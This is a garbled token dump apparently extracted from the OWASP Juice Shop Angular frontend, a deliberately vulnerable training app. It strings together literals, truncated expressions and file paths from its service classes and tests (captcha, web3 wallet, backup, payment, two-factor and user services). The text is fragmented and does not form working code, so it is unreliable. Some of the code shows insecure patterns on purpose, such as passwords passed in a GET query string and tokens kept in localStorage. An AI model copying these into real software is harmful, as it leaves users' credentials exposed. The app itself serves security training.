Drive/Git/juice-shop/frontend/src/app/Services/image-captcha.service.spec.tsImageCaptchaService'./image-captcha.service''ImageCaptchaService''http://localhost:3000/rest/image-captcha/''./imag ... ervice'./image-captcha.service/image-captcha'ImageC ... ervice'[ImageC ... ervice][ImageC ... roller]http://localhost:3000/rest/image-captcha/P:/My Drive/Git/juice-shop/frontend/src/app/Services/image-captcha.service.ts'/rest/image-captcha/'class I ... \n  }\r\n}this.ht ... tcha/')this.ho ... ptcha/''/rest/ ... ptcha/'/rest/image-captcha/P:/My Drive/Git/juice-shop/frontend/src/app/Services/keys.service.tsKeysService'/rest/web3'nftUnlocked'/nftUnlocked'nftMintListen'/nftMintListen'checkNftMinted'/api/Challenges/?key=nftMintChallenge'submitKeyprivateKey'/submitKey'verifyNFTWalletwalletAddress'/walletNFTVerify'walletAddressSend'/walletExploitAddress'class K ... \n  }\r\n}private ... t/web3'this.ho ... t/web3'/rest/web3constru ... ent) {}nftUnlo ...  )\r\n  }this.ht ... ocked')this.ho ... locked'/nftUnlockedcatchEr ...      })(err) = ...       }nftMint ...  )\r\n  }this.ht ... isten')this.ho ... Listen'/nftMintListencheckNf ...  )\r\n  }this.ht ... lenge')this.ho ... llenge''/api/C ... llenge'/api/Challenges/?key=nftMintChallengesubmitK ...  )\r\n  }const e ... mitKey'endpoin ... mitKey'this.ho ... mitKey'/submitKeyconst p ... teKey }params  ... teKey }{ privateKey }verifyN ...  )\r\n  }const e ... Verify'endpoin ... Verify'this.ho ... Verify'/walletNFTVerifyconst p ... dress }params  ... dress }{ walletAddress }walletA ...  )\r\n  }const e ... ddress'endpoin ... ddress'this.ho ... ddress''/walle ... ddress'/walletExploitAddressP:/My Drive/Git/juice-shop/frontend/src/app/Services/languages.service.spec.tsLanguagesService'./languages.service''LanguagesService''should get the language list through the rest API'getLanguages'http://localhost:3000/rest/languages''./lang ... ervice'./languages.service/languagesbeforeE ... \r\n  }))() => T ... ]\r\n  })TestBed ... ]\r\n  }){\r\n     ... e]\r\n  }[LanguagesService]const s ... ervice)should get the language list through the rest API[Langua ... roller]service ... uages()service.getLanguagesconst r ... uages')req = h ... uages')httpMoc ... uages')'http:/ ... guages'http://localhost:3000/rest/languagesP:/My Drive/Git/juice-shop/frontend/src/app/Services/languages.service.ts}/rest/languages`class L ... \n  }\r\n}getLang ... ))\r\n  }this.ht ... uages`)`${this ... guages`/rest/languagesP:/My Drive/Git/juice-shop/frontend/src/app/Services/local-backup.service.spec.tswaitForAsyncLocalBackupService'./local-backup.service'CookieModuleCookieService'ngx-cookie'TranslateFakeLoaderTranslateLoaderTranslateModule'@ngx-translate/core'MatSnackBar'@angular/material/snack-bar'BrowserAnimationsModule'@angular/platform-browser/animations''file-saver''LocalBackupService'snackBarcookieServicechallengeServicecreateSpyObj'MatSnackBar''open''restoreProgress''continueCode''continueCodeFindIt''continueCodeFixIt'forRootloaderprovideuseClassuseValue'should save language to file''saveAs'stub'language''de''text/plain;charset=utf-8'saveAstoHaveBeenCalledWith`owasp_juice_shop-${'T'}.json`'should restore language from backup file''{ "version": 1, "language": "cn" }''test.json''cn'toHaveBeenCalled'should not restore language from an outdated backup version''{ "version": 0, "language": "cn" }''./loca ... ervice'./local-backup.service/local-backupimport  ... cookie'import  ... e/core''@ngx-t ... e/core'import  ... ck-bar''@angul ... ck-bar'@angular/material/snack-barimport  ... ations''@angul ... ations'@angular/platform-browser/animationsBrowser ... sModuleimport  ... -saver'* as FileSaverdescrib ... )))\r\n})() => { ... })))\r\n}{\r\n  le ... })))\r\n}let snackBar: anysnackBar: anylet coo ... ce: anycookieService: anylet cha ... ce: anychallen ... ce: anysnackBa ... open'])jasmine ... open'])jasmine.createSpyObj['open']snackBa ... e(null)snackBa ... rnValuesnackBar.open.andsnackBar.openchallen ... ixIt'])jasmine ... ixIt'])['resto ... FixIt']CookieM ... rRoot()CookieModule.forRootTransla ...      })Transla ... forRootloader: ...       }provide ... eLoaderuseClas ... eLoaderprovide ...       ]{ provi ... ckBar }provide: MatSnackBaruseValue: snackBar{ provi ... rvice }provide ... ServiceuseValu ... ServicecookieS ... ervice)[LocalBackupService]'should ... o file'should save language to file(servic ... `)\r\n  }spyOn(F ... .stub()spyOn(F ... nd.stubspyOn(F ... s').andspyOn(F ... aveAs')cookieS ... , 'de')cookieService.putdeconst b ... f-8' })blob =  ... f-8' })new Blo ... f-8' })[JSON.s ... de' })]JSON.st ... 'de' }){ versi ...  'de' }language: 'de'{ type: ... tf-8' }type: ' ... =utf-8''text/p ... =utf-8'text/plain;charset=utf-8expect( ... .json`)expect( ... ledWithexpect( ... saveAs)FileSaver.saveAs`owasp_ ... }.json`owasp_juice_shop-new Dat ... 'T')[0]new Dat ... it('T')new Dat ... ).splitnew Dat ... tring()new Dat ... OString.jsonit('sho ... \n  })))'should ... p file'should restore language from backup filewaitFor ... \r\n  }))(servic ... })\r\n  }service ... \n    })service ... json'))service.restorenew Fil ... .json')['{ "ve ... cn" }']'{ "ver ... "cn" }'{ "version": 1, "language": "cn" }test.json() => { ... \r\n    }expect( ... e('cn')expect( ... uage'))cookieS ... guage')cookieService.getcnexpect( ... alled()expect( ... nCalledexpect( ... r.open)'should ... ersion'should not restore language from an outdated backup version{ "version": 0, "language": "cn" }expect( ... e('de')P:/My Drive/Git/juice-shop/frontend/src/app/Services/local-backup.service.ts'../Models/backup.model'SnackBarHelperService'./snack-bar-helper.service'forkJoinsnackBarHelperService'owasp_juice_shop'backup'welcomebanner_status''cookieconsent_status'}-${'Failed to retrieve continue code(s) for backup from server. Using cookie values as fallback.'backupFilebackupDatarestoreCookiesnackBarRef'Backup has been restored from ''Apply changes now'onActionhackingProgressfindItProgressfixItProgress`Version ${} is incompatible with expected version ${'errorBar'`Backup restore operation failed: ${cookieNamecookieValue../Models/backup.model/Models/backuptype Backup'./snac ... ervice'./snack-bar-helper.service/snack-bar-helperSnackBa ... Serviceprivate ... ION = 1constru ... ar) { }snackBa ... Servicesave (f ... })\r\n  }owasp_juice_shopconst b ... RSION }backup: ... RSION }{ versi ... RSION }version ... VERSIONthis.VERSIONbackup. ... \r\n    }backup.bannerswelcome ... definedthis.co ... definedthis.co ... tatus')this.co ... ice.getthis.cookieService'welcom ... status'welcomebanner_statuscookieC ... defined'cookie ... status'cookieconsent_statusbackup. ... definedbackup.languagethis.co ... guage')const c ... eCode()continu ... eCode()this.ch ... eCode()this.ch ... nueCodethis.ch ... Serviceconst c ... indIt()continu ... indIt()this.ch ... indIt()this.ch ... eFindItconst c ... FixIt()continu ... FixIt()this.ch ... FixIt()this.ch ... deFixItforkJoi ... \n    })forkJoi ... bscribeforkJoi ... FixIt])[contin ... eFixIt]([conti ... \r\n    }backup. ... nueCodebackup.continueCodebackup. ... eFindItbackup. ... deFixIt[JSON.s ... ackup)]JSON.st ... backup)saveAs( ... .json`)`${file ... }.json`console ... back.')'Failed ... lback.'Failed to retrieve continue code(s) for backup from server. Using cookie values as fallback.Failed to retrieve continue code(s) for backup from server Using cookie values as fallbackthis.co ... eCode')this.co ... indIt')this.co ... FixIt')return  ...     }))from(ba ...     }))backupF ... \n    })backupF ... ).catchbackupF ... ().thenbackupFile.text()backupFile.text(backup ... \r\n    }const b ... upData)backup: ... upData)JSON.pa ... upData)if (bac ...       }backup. ... VERSIONbackup.versionthis.re ... Status)this.restoreCookiebackup. ... rStatusbackup. ... tStatusthis.re ... nguage)this.re ... FindIt)this.re ... eFixIt)this.re ... ueCode)const s ...      })snackBa ...      })this.sn ...      })this.snackBar.openthis.snackBar'Backup ... le.name'Backup ...  from 'Backup has been restored from backupFile.nameApply changes nowduration: 10000snackBa ... bscribesnackBa ... ction()snackBarRef.onAction() => { ...       }const h ... f(true)hacking ... f(true)backup. ... f(true)this.ch ... eCode))this.ch ... rogressencodeU ... ueCode)of(true)const f ... f(true)findItP ... f(true)this.ch ... indIt))this.ch ... sFindItencodeU ... FindIt)fixItPr ... f(true)this.ch ... FixIt))this.ch ... ssFixItencodeU ... eFixIt)forkJoi ... err) })forkJoi ... gress])[hackin ... ogress]location.reload()location.reloadthis.sn ... orBar')this.sn ... ce.openthis.sn ... Service`Versio ... RSION}`Version  is inc ... ersion  is incompatible with expected version errorBar(err: E ... \r\n    }`Backup ... ssage}`Backup  ... ailed: Backup restore operation failed: err.messageprivate ...  }\r\n  }if (coo ... \r\n    }const e ...  Date()expires = new Date()expires ... () + 1)expires.setFullYearexpires ... r() + 1expires ... lYear()expires.getFullYearthis.co ... ires })this.co ... ice.put{ expires }this.co ... ieName)this.co ... .removeprivate ... Serviceprivate ... nackBarP:/My Drive/Git/juice-shop/frontend/src/app/Services/order-history.service.spec.tsOrderHistoryService'./order-history.service''OrderHistoryService''should get payment cards directly from the api''http://localhost:3000/rest/order-history''http://localhost:3000/rest/order-history/orders'toggleDeliveryStatus'http://localhost:3000/rest/order-history/1/delivery-status''./orde ... ervice'./order-history.service/order-history'OrderH ... ervice'[OrderH ... ervice]should get payment cards directly from the api[OrderH ... roller]const r ... story')req = h ... story')httpMoc ... story')'http:/ ... istory'http://localhost:3000/rest/order-historyservice.getAll()service.getAllconst r ... rders')req = h ... rders')httpMoc ... rders')'http:/ ... orders'http://localhost:3000/rest/order-history/ordersservice ... (1, {})service ... yStatushttp://localhost:3000/rest/order-history/1/delivery-statusP:/My Drive/Git/juice-shop/frontend/src/app/Services/order-history.service.ts'/rest/order-history''/orders'}/delivery-status`class O ... \n  }\r\n}private ... istory'this.ho ... istory''/rest/ ... istory'/rest/order-historygetAll  ... ))\r\n  }this.ht ... rders')this.ho ... orders'/orderstoggleD ... ))\r\n  }`${this ... status`/delivery-statusP:/My Drive/Git/juice-shop/frontend/src/app/Services/payment.service.spec.tsPaymentService'./payment.service''PaymentService''http://localhost:3000/api/Cards''should get single payment card directly from the api''http://localhost:3000/api/Cards/1''should create payment card directly from the api''http://localhost:3000/api/Cards/''should delete payment card directly from the api'./payment.service/payment[PaymentService][Paymen ... roller]const r ... Cards')req = h ... Cards')httpMoc ... Cards')'http:/ ... /Cards'http://localhost:3000/api/Cardsshould get single payment card directly from the apiconst r ... rds/1')req = h ... rds/1')httpMoc ... rds/1')'http:/ ... ards/1'http://localhost:3000/api/Cards/1should create payment card directly from the apiconst r ... ards/')req = h ... ards/')httpMoc ... ards/')'http:/ ... Cards/'http://localhost:3000/api/Cards/should delete payment card directly from the apiP:/My Drive/Git/juice-shop/frontend/src/app/Services/payment.service.tsclass P ... \n  }\r\n}private ... /Cards'this.ho ... /Cards'P:/My Drive/Git/juice-shop/frontend/src/app/Services/photo-wall.service.spec.tsPhotoWallService'./photo-wall.service''PhotoWallService''should get memories directly from the api''http://localhost:3000/rest/memories/''should create memories directly from the api'addMemory'str''image''http://localhost:3000/rest/memories''./phot ... ervice'./photo-wall.service/photo-wall[PhotoWallService]should get memories directly from the api[PhotoW ... roller]const r ... ries/')req = h ... ries/')httpMoc ... ries/')'http:/ ... ories/'http://localhost:3000/rest/memories/should create memories directly from the apiservice ... mage'))service.addMemorynew Fil ... image')['']const r ... ories')req = h ... ories')httpMoc ... ories')'http:/ ... mories'http://localhost:3000/rest/memoriesP:/My Drive/Git/juice-shop/frontend/src/app/Services/photo-wall.service.ts'/rest/memories'postData'caption'private ... mories'this.ho ... mories'/rest/memoriesaddMemo ... ))\r\n  }const p ... mData()postDat ... mData()new FormData()postDat ... aption)postData.appendthis.ht ... a).pipethis.ht ... stData)P:/My Drive/Git/juice-shop/frontend/src/app/Services/product-review.service.spec.tsProductReviewService'./product-review.service''ProductReviewService''should get product reviews directly via the rest api'42'http://localhost:3000/rest/products/42/reviews''should create product reviews directly via the rest api''A''B''should edit product reviews directly via the rest api'patch'http://localhost:3000/rest/products/reviews''PATCH''./prod ... ervice'./product-review.service/product-review'Produc ... ervice'[Produc ... ervice]should get product reviews directly via the rest api[Produc ... roller]service.get(42)const r ... views')req = h ... views')httpMoc ... views')'http:/ ... eviews'http://localhost:3000/rest/products/42/reviewsshould create product reviews directly via the rest apiservice ...  'B' })service.create{ messa ... : 'B' }message: 'A'Aauthor: 'B'B(data:  ... = data)expect( ...  'B' })should edit product reviews directly via the rest apiservice ... ring })service.patchnull as ... tring }null as unknown{ id: s ... tring }id: string,http://localhost:3000/rest/products/reviewsexpect( ... PATCH')PATCHexpect( ... e(null)P:/My Drive/Git/juice-shop/frontend/src/app/Services/product-review.service.ts'/rest/products'}/reviews`review'/reviews'likeprivate ... oducts'this.ho ... oducts'/rest/productsget (id ...  )\r\n  }this.ht ... views`)`${this ... eviews`/reviews(err: E ...       }create  ...  )\r\n  }{ messa ... tring }message: string,this.ht ... w).pipethis.ht ... review)patch ( ... ))\r\n  }this.http.patchthis.ho ... eviews'like (_ ... ))\r\n  }this.ht ...  _id }){ id: _id }id: _idP:/My Drive/Git/juice-shop/frontend/src/app/Services/product.service.spec.tsProductService'./product.service''ProductService''should search for products directly from the rest api''1''http://localhost:3000/rest/products/search?q=1''should get all products directly from the rest api''http://localhost:3000/api/Products/''should get single product directly from the rest api''http://localhost:3000/api/Products/1?d='./product.service/product[ProductService]should search for products directly from the rest apiservice.search('1')service.searchconst r ... h?q=1')req = h ... h?q=1')httpMoc ... h?q=1')'http:/ ... ch?q=1'http://localhost:3000/rest/products/search?q=1http://localhost:3000/rest/products/search?q=1should get all products directly from the rest apiconst r ... ucts/')req = h ... ucts/')httpMoc ... ucts/')'http:/ ... ducts/'http://localhost:3000/api/Products/should get single product directly from the rest apiconst r ... ing()))req = h ... ing()))httpMoc ... ing()))'http:/ ... ring())'http:/ ... s/1?d='http://localhost:3000/api/Products/1?d=encodeU ... ring())new Dat ... eStringP:/My Drive/Git/juice-shop/frontend/src/app/Services/product.service.ts}/rest/products/search?q=${}?d=${search  ... ))\r\n  }this.ht ... eria}`)`${this ... teria}`/rest/p ... arch?q=/rest/products/search?q=this.ht ... g())}`)`${this ... ng())}`?d=P:/My Drive/Git/juice-shop/frontend/src/app/Services/quantity.service.spec.tsQuantityService'./quantity.service''QuantityService''should get all quantities directly from the rest api''http://localhost:3000/api/Quantitys/''should change quantity directly via the rest api''http://localhost:3000/api/Quantitys/42'./quantity.service/quantity[QuantityService]should get all quantities directly from the rest api[Quanti ... roller]const r ... itys/')req = h ... itys/')httpMoc ... itys/')'http:/ ... titys/'http://localhost:3000/api/Quantitys/should change quantity directly via the rest apiservice.put(42, {})const r ... ys/42')req = h ... ys/42')httpMoc ... ys/42')'http:/ ... tys/42'http://localhost:3000/api/Quantitys/42expect( ... ual({})P:/My Drive/Git/juice-shop/frontend/src/app/Services/quantity.service.tsclass Q ... \n  }\r\n}private ... ntitys'this.ho ... ntitys'P:/My Drive/Git/juice-shop/frontend/src/app/Services/recycle.service.spec.tsRecycleService'./recycle.service''RecycleService''should find the recycle directly from the rest api''http://localhost:3000/api/Recycles/''should create recycle directly via the rest api'./recycle.service/recycle[RecycleService]should find the recycle directly from the rest api[Recycl ... roller]const r ... cles/')req = h ... cles/')httpMoc ... cles/')'http:/ ... ycles/'http://localhost:3000/api/Recycles/should create recycle directly via the rest apiservice.save(1)P:/My Drive/Git/juice-shop/frontend/src/app/Services/recycle.service.tsclass R ... \n  }\r\n}private ... cycles'this.ho ... cycles'P:/My Drive/Git/juice-shop/frontend/src/app/Services/request.interceptor.tsHttpEventHttpHandlerHttpInterceptorHttpRequestRequestInterceptorsetHeadersAuthorization`Bearer ${'email''X-User-Email'type HttpEventtype HttpHandlertype HttpInterceptortype HttpRequest@Injectable()Injectable()interce ... q)\r\n  }Observa ... t<any>>HttpEvent<any>HttpRequest<any>{\r\n     ... q)\r\n  }if (loc ... \r\n    }localSt ... token')localStorage.getItemreq = r ...      })req.clo ...      })req.clonesetHead ...       }Authori ... ken')}``Bearer ... ken')}`Bearer localSt ... email')'X-User ... mail'))X-User-EmailString( ... mail'))return  ... le(req)next.handle(req)next.handleconstructor() {}P:/My Drive/Git/juice-shop/frontend/src/app/Services/security-answer.service.spec.tsSecurityAnswerService'./security-answer.service''SecurityAnswerService''http://localhost:3000/api/SecurityAnswers/''./secu ... ervice'./security-answer.service/security-answerSecurit ... Service'Securi ... ervice'[Securi ... ervice][Securi ... roller]const r ... wers/')req = h ... wers/')httpMoc ... wers/')'http:/ ... swers/'http://localhost:3000/api/SecurityAnswers/P:/My Drive/Git/juice-shop/frontend/src/app/Services/security-answer.service.tsclass S ... \n  }\r\n}private ... nswers'this.ho ... nswers'save (p ...  )\r\n  }P:/My Drive/Git/juice-shop/frontend/src/app/Services/security-question.service.spec.tsSecurityQuestionService'./security-question.service''SecurityQuestionService''http://localhost:3000/api/SecurityQuestions/''should get security question by user email directly from the rest api'findBy'x@y.z''http://localhost:3000/rest/user/security-question?email=x@y.z'./security-question.service/security-questionconst r ... ions/')req = h ... ions/')httpMoc ... ions/')'http:/ ... tions/'http://localhost:3000/api/SecurityQuestions/should get security question by user email directly from the rest apiservice ... x@y.z')service.findByx@y.zx@yconst r ... x@y.z')req = h ... x@y.z')httpMoc ... x@y.z')'http:/ ... =x@y.z'http://localhost:3000/rest/user/security-question?email=x@y.zhttp://localhost:3000/rest/user/security-question?email=x@y{ quest ... onse' }questio ... sponse'P:/My Drive/Git/juice-shop/frontend/src/app/Services/security-question.service.ts'src/environments/environment''rest/user/security-question?email=''src/en ... onment'src/environments/environmentprivate ... stions'this.ho ... stions'findBy  ...  )\r\n  }this.ht ... l).pipethis.ht ...  email)this.ho ... + emailthis.ho ... email='this.ho ... r + '/''rest/u ... email='rest/user/security-question?email=map((re ... estion)(respon ... uestionresponse.questionP:/My Drive/Git/juice-shop/frontend/src/app/Services/snack-bar-helper.service.spec.tsTranslateServiceMatSnackBarModule'SnackBarHelperService'describ ...  })\r\n})'SnackB ... ervice'() => { ...   })\r\n}{\r\n  be ...   })\r\n}beforeE ... })\r\n  )() =>\r\n ... \n    })[TranslateService]P:/My Drive/Git/juice-shop/frontend/src/app/Services/snack-bar-helper.service.tstranslateServicecssClasstranslatedMessage'X'panelClassopen (m ... })\r\n  }this.tr ... \n    })this.tr ... bscribethis.tr ... essage)this.tr ... ice.getthis.tr ... Service(transl ... \r\n    }Xduration: 5000panelClass: cssClassP:/My Drive/Git/juice-shop/frontend/src/app/Services/socket-io.service.spec.tsSocketIoService'./socket-io.service''SocketIoService''./sock ... ervice'./socket-io.service/socket-io[SocketIoService]P:/My Drive/Git/juice-shop/frontend/src/app/Services/socket-io.service.tsNgZoneio'socket.io-client'_socketngZonerunOutsideAngular'socket.io'import  ... client'io-clienttype Socketprivate ...  Socketconstru ... })\r\n  }this.ng ... \n    })this.ng ... Angularthis.ngZoneif (env ...       }environ ... === '.'this._s ...      })this._socketio(wind ...      })window. ... .originpath: ( ... ket.io'(window ... ket.io'(window ...  + '/')window. ... e + '/'window. ... th('/')window. ... ndsWithwindow. ... athnamesocket.iothis._s ... Server)io(envi ... Server)socket  ... et\r\n  }{\r\n     ... et\r\n  }return this._socketprivate ...  NgZoneP:/My Drive/Git/juice-shop/frontend/src/app/Services/track-order.service.spec.tsTrackOrderService'./track-order.service''TrackOrderService''should get tracking order results directly via the rest api''5267-f9cd5882f54c75a3''http://localhost:3000/rest/track-order/5267-f9cd5882f54c75a3''./trac ... ervice'./track-order.service/track-order[TrackOrderService]should get tracking order results directly via the rest api[TrackO ... roller]service ... c75a3')'5267-f ... 4c75a3'5267-f9cd5882f54c75a3const r ... c75a3')req = h ... c75a3')httpMoc ... c75a3')'http:/ ... 4c75a3'http://localhost:3000/rest/track-order/5267-f9cd5882f54c75a3P:/My Drive/Git/juice-shop/frontend/src/app/Services/track-order.service.ts'/rest/track-order'class T ... \n  }\r\n}private ... -order'this.ho ... -order'/rest/track-orderparams  ... params)encodeU ... params)this.ht ... rams}`)`${this ... arams}`P:/My Drive/Git/juice-shop/frontend/src/app/Services/two-factor-auth-service.spec.tsTwoFactorAuthService'./two-factor-auth-service''TwoFactorAuthServiceService''should verify TOTP token directly via the rest api''totp_tmp_token''000000''123456''http://localhost:3000/rest/2fa/verify'authenticationtmpTokentotpToken'should retrieve 2FA status directly via the rest api''http://localhost:3000/rest/2fa/status''should set up 2FA directly via the rest api''s3cr3t!''initialToken''setupToken''http://localhost:3000/rest/2fa/setup'initialTokensetupToken'should disable 2FA directly via the rest api''http://localhost:3000/rest/2fa/disable''./two- ... ervice'./two-factor-auth-service/two-factor-auth-service'TwoFac ... ervice'TwoFactorAuthServiceService[TwoFac ... ervice]should verify TOTP token directly via the rest api[TwoFac ... roller]localSt ... 00000')localStorage.setItemtotp_tmp_token000000service ... 23456')service.verify123456const r ... erify')req = h ... erify')httpMoc ... erify')'http:/ ... verify'http://localhost:3000/rest/2fa/verify{ authe ... onse' }authent ... sponse'expect( ... 456' }){ tmpTo ... 3456' }tmpToken: '000000'totpToken: '123456'should retrieve 2FA status directly via the rest apiservice.status()service.statushttp://localhost:3000/rest/2fa/statusreq.flu ... alse }){ setup: false }setup: falseexpect( ... alse })should set up 2FA directly via the rest apiservice ... Token')service.setups3cr3t!const r ... setup')req = h ... setup')httpMoc ... setup')'http:/ ... /setup'http://localhost:3000/rest/2fa/setupreq.flush({})expect( ... ken' }){ passw ... oken' }password: 's3cr3t!'initial ... lToken'setupTo ... pToken'expect( ... efined)should disable 2FA directly via the rest apiservice ... cr3t!')service.disableconst r ... sable')req = h ... sable')httpMoc ... sable')'http:/ ... isable'http://localhost:3000/rest/2fa/disableexpect( ... 3t!' }){ passw ... r3t!' }P:/My Drive/Git/juice-shop/frontend/src/app/Services/two-factor-auth-service.tsTwoFactorVerifyResponseAuthenticationPayloadumailTwoFactorAuthStatusPayloadsecret}/rest/2fa/verify`}/rest/2fa/status`}/rest/2fa/setup`}/rest/2fa/disable`interfa ... load\r\n}TwoFact ... esponseauthent ... PayloadAuthent ... Payloadtoken: stringbid: numberumail: stringTwoFact ... Payloadsetup: booleansecret?: stringsetupToken?: stringemail?: stringverify  ... ))\r\n  }Observa ... ayload>`${envi ... verify`/rest/2fa/verifytmpToke ... token')map((re ... cation)(respon ... icationrespons ... icationstatus  ... ))\r\n  }this.ht ...   .pipethis.ht ... tatus`)`${envi ... status`/rest/2fa/statussetup ( ... ))\r\n  }Observable<void>`${envi ... /setup`/rest/2fa/setupmap(() => undefined)() => undefineddisable ... ))\r\n  }this.ht ... word })`${envi ... isable`/rest/2fa/disable{ password }P:/My Drive/Git/juice-shop/frontend/src/app/Services/user.service.spec.tsUserService'./user.service''UserService''should get all users directly from the rest api''http://localhost:3000/rest/user/authentication-details/''should get single users directly from the rest api''http://localhost:3000/api/Users/1''should create user directly via the rest api''http://localhost:3000/api/Users/''should login user directly via the rest api''http://localhost:3000/rest/user/login''should change user password directly via the rest api'changePassword'foo''bar''http://localhost:3000/rest/user/change-password?current=foo&new=bar&repeat=bar''should return the logged-in users identity directly from the rest api'whoAmI'http://localhost:3000/rest/user/whoami''should reset the password directly from the rest api'mockObject'apiRequest'resetPassword'http://localhost:3000/rest/user/reset-password''should get users deluxe status directly from the rest api'deluxeStatus'http://localhost:3000/rest/deluxe-membership''should upgrade users deluxe status directly from the rest api'upgradeToDeluxe./user.service/user[UserService]should get all users directly from the rest api[UserSe ... roller]const r ... ails/')req = h ... ails/')httpMoc ... ails/')'http:/ ... tails/'http://localhost:3000/rest/user/authentication-details/should get single users directly from the rest apiconst r ... ers/1')req = h ... ers/1')httpMoc ... ers/1')'http:/ ... sers/1'http://localhost:3000/api/Users/1should create user directly via the rest apiconst r ... sers/')req = h ... sers/')httpMoc ... sers/')'http:/ ... Users/'http://localhost:3000/api/Users/should login user directly via the rest apiservice.login(null)service.loginconst r ... login')req = h ... login')httpMoc ... login')'http:/ ... /login'http://localhost:3000/rest/user/loginshould change user password directly via the rest apiservice ... bar' })service ... assword{ curre ... 'bar' }current: 'foo'foonew: 'bar'barrepeat: 'bar'const r ... t=bar')req = h ... t=bar')httpMoc ... t=bar')'http:/ ... at=bar'http://localhost:3000/rest/user/change-password?current=foo&new=bar&repeat=barhttp://localhost:3000/rest/user/change-password?current=foo&new=bar&repeat=bar{ user: ... onse' }user: 'apiResponse'should return the logged-in users identity directly from the rest apiservice.whoAmI()service.whoAmIconst r ... hoami')req = h ... hoami')httpMoc ... hoami')'http:/ ... whoami'http://localhost:3000/rest/user/whoamishould reset the password directly from the rest apiconst m ... uest' }mockObj ... uest' }{ req:  ... uest' }req: 'apiRequest'apiRequestservice ... Object)const r ... sword')req = h ... sword')httpMoc ... sword')'http:/ ... ssword'http://localhost:3000/rest/user/reset-passwordexpect( ... Object)should get users deluxe status directly from the rest apiservice.deluxeStatusconst r ... rship')req = h ... rship')httpMoc ... rship')'http:/ ... ership'http://localhost:3000/rest/deluxe-membershipshould upgrade users deluxe status directly from the rest apiservice ... , null)service ... oDeluxeP:/My Drive/Git/juice-shop/frontend/src/app/Services/user.service.tsPasswordsisLoggedIn'/rest/user/authentication-details/''/rest/user/login'getLoggedInStatepasswords'/rest/user/change-password?current=''&new=''&repeat=''/rest/user/whoami'oauthLoginaccessToken'https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token='saveLastLoginIp'/rest/saveLoginIp''/rest/deluxe-membership'paymentModecurrent?: stringnew?: stringrepeat?: stringclass U ... \n  }\r\n}private ... /Users'this.ho ... /Users'this.ho ... tails/''/rest/ ... tails/'/rest/user/authentication-details/login ( ... ))\r\n  }this.is ... t(true)this.isLoggedIn.nextthis.isLoggedInthis.ho ... /login'/rest/user/logingetLogg ... ()\r\n  }this.is ... vable()this.is ... ervablechangeP ... ))\r\n  }this.ht ... repeat)this.ho ... .repeatthis.ho ... epeat='this.ho ... rds.newthis.ho ... '&new='this.ho ... currentthis.ho ... rrent=''/rest/ ... rrent='/rest/user/change-password?current=passwords.current&new=passwords.new&repeat=passwords.repeatmap((re ... e.user)(respon ... se.userresponse.user(err) = ... error }{ throw err.error }throw err.errorerr.errorresetPa ... ))\r\n  }this.ho ... ssword'whoAmI  ... ))\r\n  }this.ht ... hoami')this.ho ... whoami'/rest/user/whoamioauthLo ... n)\r\n  }{\r\n     ... n)\r\n  }return  ... sToken)this.ht ... sToken)'https: ... ssToken'https: ... token='https://www.googleapis.com/oauth2/v1/userinfo?alt=json&access_token=saveLas ... ))\r\n  }this.ht ... ginIp')this.ho ... oginIp'/rest/saveLoginIpdeluxeS ... ))\r\n  }this.ht ... rship')this.ho ... ership''/rest/ ... ership'/rest/deluxe-membershipupgrade ... ))\r\n  }this.ht ... ntId }){ payme ... entId }P:/My Drive/Git/juice-shop/frontend/src/app/Services/vuln-lines.service.spec.tsVulnLinesService'./vuln-lines.service''VulnLinesService''http://localhost:3000/snippets/verdict'selectedLines'./vuln ... ervice'./vuln-lines.service/vuln-lines[VulnLinesService][VulnLi ... roller]service ... [1, 2])[1, 2]const r ... rdict')req = h ... rdict')httpMoc ... rdict')'http:/ ... erdict'http://localhost:3000/snippets/verdictexpect( ... , 2] }){ key:  ... 1, 2] }selecte ...  [1, 2]P:/My Drive/Git/juice-shop/frontend/src/app/Services/vuln-lines.service.ts'/snippets/verdict'class V ... \n  }\r\n}private ... erdict'this.ho ... erdict'/snippets/verdictP:/My Drive/Git/juice-shop/frontend/src/app/Services/wallet.service.spec.tsWalletService'./wallet.service''WalletService''should get wallet balance directly from the api''http://localhost:3000/rest/wallet/balance''should update wallet balance directly from the api'./wallet.service/wallet[WalletService]should get wallet balance directly from the api[Wallet ... roller]const r ... lance')req = h ... lance')httpMoc ... lance')'http:/ ... alance'http://localhost:3000/rest/wallet/balanceshould update wallet balance directly from the apiservice.put(1)P:/My Drive/Git/juice-shop/frontend/src/app/Services/wallet.service.ts'/rest/wallet/balance'class W ... \n  }\r\n}private ... alance'this.ho ... alance''/rest/ ... alance'/rest/wallet/balanceput (pa ... ))\r\n  }P:/My Drive/Git/juice-shop/frontend/src/app/Services/window-ref.service.spec.tsWindowRefService'./window-ref.service''WindowRefService''./wind ... ervice'./window-ref.service/window-ref[WindowRefService]P:/My Drive/Git/juice-shop/frontend/src/app/Services/window-ref.service.tsnativeWindowgetWindowget nat ... ()\r\n  }return getWindow()getWindow()functio ... ndow\r\n}{\r\n  re ... ndow\r\n}return windowP:/My Drive/Git/juice-shop/frontend/src/app/about/about.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/about'300px'300px'10px'10pxslideshowDataSourcetwitter ... bookUrldivfxLayoutAligncentermat-cardmat-elevation-z6sectionabout-us*ngIftwitterUrl || facebookUrl[href]_blanknoopener noreferreraria-labelButton for the NFT of the shopmat-raised-buttonaccentfas fa-palette fa-lgButton for the PressKit page of the shopfar fa-newspaper fa-lgButton for the Reddit page of the shopfab fa-reddit fa-lgButton for the Slack page of the shopfab fa-slack fa-lgButton for the Facebook page of the shopfab fa-facebook fa-lgmargin-left: 0px;Button for the Twitter page of the shopfab fa-twitter fa-lgh3slideshow[height][autoPlay][arrowSize][showArrows][showDots][imageUrls]text-justifyftp/legal.mdLink to the Terms of Useh1<!--
  ~ Copyright (c) 2014-2024 Bjoern Kimminich & the OWASP Juice Shop contributors.
  ~ SPDX-License-Identifier: MIT
